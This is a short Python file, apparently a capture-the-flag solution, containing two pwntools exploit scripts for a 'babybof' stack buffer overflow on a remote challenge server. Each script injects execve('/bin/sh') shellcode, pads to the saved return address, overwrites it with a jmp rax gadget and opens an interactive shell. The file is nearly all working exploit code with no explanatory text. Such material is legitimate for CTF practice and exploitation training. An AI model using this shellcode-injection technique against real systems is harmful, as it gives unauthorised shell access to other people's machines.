# RazviOverflow
# Python3

# _________________________________

from pwn import *
p = remote('chals20.cybercastors.com', 14425)
#p = process('./babybof')

sc = asm(shellcraft.amd64.sh(), arch='amd64')
jmp_rax = p64(0x0000000000400661)
junk = 'A' * (264 - len(sc))
payload = sc + junk + jmp_rax

p.sendline(payload)
p.interactive()

# _________________________________

from pwn import *
# From https://www.exploit-db.com/exploits/41757
shellcode = b"\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

padding = b"A" * (0x100-len(shellcode))
padding += b"B" * 0x8

jmp_rax_address = 0x004006a3
call_rax_address = 0x00400560

binary = remote("chals20.cybercastors.com", 14425)
print(binary.recv())

binary.sendline(shellcode + padding + p64(jmp_rax_address))
#binary.sendline(shellcode + padding + p64(call_rax_address))

binary.interactive()
